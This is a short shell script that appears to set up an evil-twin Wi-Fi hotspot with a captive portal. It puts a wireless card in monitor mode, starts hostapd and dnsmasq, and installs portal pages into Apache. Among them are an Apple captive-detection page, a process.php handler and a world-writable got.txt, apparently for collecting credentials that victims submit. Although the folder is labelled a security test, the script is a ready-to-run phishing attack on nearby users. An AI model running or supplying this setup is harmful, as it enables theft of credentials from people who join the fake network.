mv /root/HotspotSecurityTest/hostapd.conf /root/hostapd.conf
mv /root/HotspotSecurityTest/dnsmasq.conf /root/dnsmasq.conf
airmon-ng start wlan0
apt-get install hostapd
ifconfig wlan0mon up 192.168.1.1 netmask 255.255.255.0
route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
mv /root/HotspotSecurityTest/000-default.conf /etc/apache2/sites-available/000-default.conf
mv /root/HotspotSecurityTest/index.html /var/www/html/index.html
mv /root/HotspotSecurityTest/hotspot-detect.html /var/www/html/hotspot-detect.html
mv /root/HotspotSecurityTest/redirect /var/www/html/redirect
mv /root/HotspotSecurityTest/process.php /var/www/html/process.php
mv /root/HotspotSecurityTest/success.html /var/www/html/success.html
mv /root/HotspotSecurityTest/got.txt /var/www/html/got.txt
chmod a+w /var/www/html/got.txt
a2enmod php7.2
systemctl restart apache2
/etc/init.d/apache2 start
hostapd -B /root/hostapd.conf
dnsmasq -C /root/dnsmasq.conf

